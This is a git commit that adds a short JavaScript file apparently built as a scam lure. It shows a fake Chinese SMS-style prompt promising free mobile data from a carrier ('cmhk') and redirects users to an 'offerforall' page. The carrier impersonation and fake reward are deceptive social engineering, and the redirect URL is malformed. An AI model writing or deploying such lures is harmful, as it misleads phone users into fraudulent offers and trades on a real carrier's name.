22a9222b6af37634ba8a8ea58661a9c7aea411c2
harryjohnson86 <mfonjohnson86@gmail.com>
2025-04-09 14:59:30 -0700

    Create activate-cmhk10gb-data.com.js

---
+++ activate-cmhk10gb-data.com.js
@@ -0,0 +1,5 @@
+var password = '免费数据'
+password=prompt('SMS: 恭喜您的号码有资格获得免费数据旧 SIM 卡奖励，请按“确定”激活. ','免费数据');
+if (password != '免费数据') {
+location.href='https://offerforall/activate-cmhk10gb-data.com.html';
+}
